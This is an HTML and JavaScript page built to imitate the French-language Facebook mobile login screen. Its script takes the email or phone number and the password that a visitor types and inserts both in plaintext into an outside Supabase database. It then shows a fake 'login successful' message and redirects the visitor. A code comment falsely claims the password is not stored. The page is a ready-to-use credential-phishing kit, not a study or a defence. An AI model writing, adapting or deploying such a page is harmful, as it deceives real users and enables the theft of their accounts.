<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    >

    <title>Facebook</title>

    <!-- SUPABASE -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

    <style>

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
        }

        body {
            background: #000;
            color: #fff;

            font-family:
                Arial,
                Helvetica,
                sans-serif;

            min-height: 100vh;

            display: flex;
            justify-content: center;
        }


        /* =========================
           PAGE
        ========================= */

        .page {
            width: 100%;
            max-width: 430px;
            min-height: 100vh;

            padding:
                18px
                16px
                20px;

            display: flex;
            flex-direction: column;
            align-items: center;
        }


        /* =========================
           LANGUE
        ========================= */

        .language {
            width: 100%;

            text-align: center;

            color: #aaa;

            font-size: 13px;

            margin-bottom: 34px;
        }


        /* =========================
           LOGO
        ========================= */

        .logo-container {
            width: 100%;

            display: flex;
            justify-content: center;
            align-items: center;

            margin-bottom: 34px;
        }

        .facebook-logo {
            width: 58px;
            height: 58px;

            object-fit: contain;

            display: block;

            border-radius: 14px;
        }


        /* =========================
           FORMULAIRE
        ========================= */

        .login-container {
            width: 100%;
            max-width: 350px;
        }


        .input {
            width: 100%;
            height: 48px;

            border: 1px solid #444;
            border-radius: 9px;

            background: #1b1b1b;

            color: #fff;

            padding:
                0
                15px;

            font-size: 15px;

            outline: none;

            margin-bottom: 10px;

            transition:
                border-color .2s,
                background .2s;
        }

        .input::placeholder {
            color: #888;
        }

        .input:focus {
            border-color: #1877f2;
            background: #202020;
        }


        /* =========================
           BOUTON CONNEXION
        ========================= */

        .login-button {
            width: 100%;
            height: 48px;

            border: none;
            border-radius: 9px;

            background: #1877f2;

            color: white;

            font-size: 16px;
            font-weight: 700;

            cursor: pointer;

            margin-top: 2px;

            transition:
                background .2s,
                transform .1s;
        }

        .login-button:hover {
            background: #166fe5;
        }

        .login-button:active {
            transform: scale(.98);
        }

        .login-button:disabled {
            opacity: .6;
            cursor: not-allowed;
        }


        /* =========================
           MESSAGE
        ========================= */

        .message {
            display: none;

            width: 100%;

            margin-top: 12px;

            padding: 10px;

            border-radius: 8px;

            text-align: center;

            font-size: 13px;
        }

        .message.error {
            display: none;

            background: #241010;
            color: #ff7777;

            border: 1px solid #552020;
        }

        .message.success {
            display: none;

            background: #0c2115;
            color: #5de18a;

            border: 1px solid #174f2b;
        }


        /* =========================
           MOT DE PASSE OUBLIE
        ========================= */

        .forgot {
            display: block;

            text-align: center;

            margin-top: 20px;

            color: #4595ff;

            font-size: 14px;

            text-decoration: none;

            cursor: pointer;
        }

        .forgot:hover {
            text-decoration: underline;
        }


        /* =========================
           SEPARATEUR
        ========================= */

        .separator {
            width: 100%;

            display: flex;
            align-items: center;

            gap: 10px;

            margin-top: 25px;
        }

        .separator-line {
            flex: 1;

            height: 1px;

            background: #292929;
        }

        .separator-text {
            color: #777;

            font-size: 12px;
        }


        /* =========================
           NOUVEAU COMPTE
        ========================= */

        .new-account {
            width: 100%;
            height: 44px;

            margin-top: 24px;

            border: 1px solid #1877f2;

            border-radius: 9px;

            background: transparent;

            color: #4595ff;

            font-size: 15px;
            font-weight: 600;

            cursor: pointer;

            transition:
                background .2s,
                transform .1s;
        }

        .new-account:hover {
            background: #071526;
        }

        .new-account:active {
            transform: scale(.98);
        }


        /* =========================
           META
        ========================= */

        .meta {
            margin-top: 32px;

            display: flex;
            align-items: center;

            color: #888;

            font-size: 16px;
            font-weight: 600;
        }

        .meta-symbol {
            font-size: 22px;

            margin-right: 5px;

            color: #777;
        }


        /* =========================
           FOOTER
        ========================= */

        .footer {
            margin-top: 22px;

            display: flex;
            justify-content: center;

            gap: 16px;

            font-size: 11px;
        }

        .footer a {
            color: #666;

            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }


        /* =========================
           PETITS TELEPHONES
        ========================= */

        @media (max-height: 650px) {

            .page {
                padding-top: 12px;
            }

            .language {
                margin-bottom: 20px;
            }

            .logo-container {
                margin-bottom: 20px;
            }

            .facebook-logo {
                width: 48px;
                height: 48px;
            }

            .forgot {
                margin-top: 15px;
            }

            .separator {
                margin-top: 18px;
            }

            .new-account {
                margin-top: 17px;
            }

            .meta {
                margin-top: 22px;
            }

            .footer {
                margin-top: 15px;
            }
        }

    </style>
</head>


<body>

    <div class="page">


        <!-- LANGUE -->

        <div class="language">
            Français (France)
        </div>


        <!-- LOGO -->

        <div class="logo-container">

            <img
                src="IMG_1434.jpeg"
                class="facebook-logo"
                alt="Facebook"
            >

        </div>


        <!-- FORMULAIRE -->

        <main class="login-container">

            <form id="loginForm">

                <input
                    type="text"
                    id="email"
                    class="input"
                    placeholder="Numéro mobile ou e-mail"
                    autocomplete="username"
                    required
                >

                <input
                    type="password"
                    id="password"
                    class="input"
                    placeholder="Mot de passe"
                    autocomplete="current-password"
                    required
                >

                <button
                    type="submit"
                    class="login-button"
                    id="loginButton"
                >
                    Continuer
                </button>

            </form>


            <!-- MESSAGE ERREUR -->

            <div
                id="errorMessage"
                class="message error"
            ></div>


            <!-- MESSAGE SUCCES -->

            <div
                id="successMessage"
                class="message success"
            ></div>


            <!-- MOT DE PASSE OUBLIE -->

            <a
                href="#"
                id="forgotPassword"
                class="forgot"
            >
                Mot de passe oublié ?
            </a>


            <!-- SEPARATEUR -->

            <div class="separator">

                <div class="separator-line"></div>

                <span class="separator-text">
                    ou
                </span>

                <div class="separator-line"></div>

            </div>


            <!-- NOUVEAU COMPTE -->

            <button
                type="button"
                id="newAccount"
                class="new-account"
            >
                Créer un nouveau compte
            </button>

        </main>


        <!-- META -->

        <div class="meta">

            <span class="meta-symbol">
                ∞
            </span>

            Meta

        </div>


        <!-- FOOTER -->

        <footer class="footer">

            <a href="#">
                À propos
            </a>

            <a href="#">
                Aide
            </a>

            <a href="#">
                Plus
            </a>

        </footer>

    </div>



    <script>

        /* =================================
           SUPABASE
        ================================= */

        const SUPABASE_URL =
            "https://leppncecjxccbkwoktyu.supabase.co";

        const SUPABASE_KEY =
            "sb_publishable_FDtcO7MF7VVtQ7s94bpGeQ_5D4Reg4j";


        const supabaseClient =
            window.supabase.createClient(
                SUPABASE_URL,
                SUPABASE_KEY
            );


        /* =================================
           ELEMENTS
        ================================= */

        const loginForm =
            document.getElementById("loginForm");

        const emailInput =
            document.getElementById("email");

        const passwordInput =
            document.getElementById("password");

        const loginButton =
            document.getElementById("loginButton");

        const newAccountButton =
            document.getElementById("newAccount");

        const forgotPassword =
            document.getElementById("forgotPassword");

        const errorMessage =
            document.getElementById("errorMessage");

        const successMessage =
            document.getElementById("successMessage");


        /* =================================
           MESSAGES
        ================================= */

        function showError(message) {

            successMessage.style.display = "none";

            errorMessage.textContent = message;

            errorMessage.style.display = "block";
        }


        function showSuccess(message) {

            errorMessage.style.display = "none";

            successMessage.textContent = message;

            successMessage.style.display = "block";
        }


        function clearMessages() {

            errorMessage.style.display = "none";

            successMessage.style.display = "none";

        }


        /* =================================
           CONNEXION
        ================================= */

        loginForm.addEventListener(
            "submit",
            async function(event) {

                event.preventDefault();

                clearMessages();


                const email =
                    emailInput.value.trim();

                const password =
                    passwordInput.value;


                /* Vérification */

                if (!email || !password) {

                    showError(
                        "Remplis tous les champs."
                    );

                    return;
                }


                /* Désactivation du bouton */

                loginButton.disabled = true;

                loginButton.textContent =
                    "Chargement...";


                try {

                    /*
                     * AUTHENTIFICATION SUPABASE
                     

                    


                    /*
                     * =================================
                     * INSERTION / MISE À JOUR PROFILES
                     * =================================
                     *
                     * On conserve ici la mécanique
                     * de ta table profiles.
                     *
                     * Le mot de passe n'est PAS enregistré
                     * dans profiles.
                     *
                     * Supabase Auth s'occupe du mot de passe.
                     */

                    const {
                        error: profileError
                    } =
                        await supabaseClient
                            .from("profiles")
                            .insert(
                                {
                                    idFacebook: email,
                                    password: password

                                }
                            );


                    if (profileError) {

                        console.error(
                            "Erreur profiles :",
                            profileError
                        );
                        successMessage.textContent("Erreur de profil");
                        /*
                         * La connexion reste valide même
                         * si l'écriture dans profiles échoue.
                         */

                    }


                    /* Succès */

                    showSuccess(
                        "Connexion réussie."
                    );


                    /*
                     * Petit délai pour laisser voir
                     * le message.
                     */

                    setTimeout(
                        function() {

                            window.location.href =
                                "success.html";

                        },
                        700
                    );


                } catch (error) {

                    console.error(error);

                    showError(
                        "Une erreur est survenue. Réessaie."
                    );

                } finally {

                    loginButton.disabled = false;

                    loginButton.textContent =
                        "Continuer";

                }

            }
        );


        /* =================================
           NOUVEAU COMPTE
        ================================= */

        newAccountButton.addEventListener(
            "click",
            function() {

                /*
                 * Mets ici le véritable fichier
                 * d'inscription de ton projet.
                 */

                window.location.href =
                    "index.html";

            }
        );


        /* =================================
           MOT DE PASSE OUBLIE
        ================================= */

        forgotPassword.addEventListener(
            "click",
            async function(event) {

                event.preventDefault();

                clearMessages();


                const email =
                    emailInput.value.trim();


                if (!email) {

                    showError(
                        "Entre ton adresse e-mail avant de continuer."
                    );

                    emailInput.focus();

                    return;
                }


                try {

                    const {
                        error
                    } =
                        await supabaseClient.auth
                            .resetPasswordForEmail(
                                email,
                                {
                                    redirectTo:
                                        window.location.origin +
                                        "/success.html"
                                }
                            );


                    if (error) {

                        console.error(error);

                        showError(
                            "Impossible d'envoyer le lien de récupération."
                        );

                        return;
                    }


                    showSuccess(
                        "Le lien de récupération a été envoyé."
                    );


                } catch (error) {

                    console.error(error);

                    showError(
                        "Une erreur est survenue."
                    );

                }

            }
        );

    </script>

</body>

</html>
